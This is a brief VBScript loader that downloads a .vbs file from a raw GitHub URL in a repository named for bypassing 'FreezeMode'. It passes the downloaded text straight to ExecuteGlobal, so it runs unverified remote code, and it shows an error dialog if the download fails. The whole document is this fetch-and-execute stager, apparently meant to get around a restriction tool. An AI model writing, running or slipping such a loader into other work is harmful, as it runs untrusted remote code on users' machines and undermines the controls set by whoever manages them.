Dim htttp, url
Set http = CreateObject("MSXML2.XMLHTTP")
url = "https://raw.githubusercontent.com/Wywren/_UNLISTED_FreezeModeBypass/refs/heads/main/prompt_v1.vbs"

http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    ExecuteGlobal http.ResponseText
Else
    MsgBox "Error Code: " & http.Status, vbCritical, "FreezeMode"
End If

Set http = Nothing
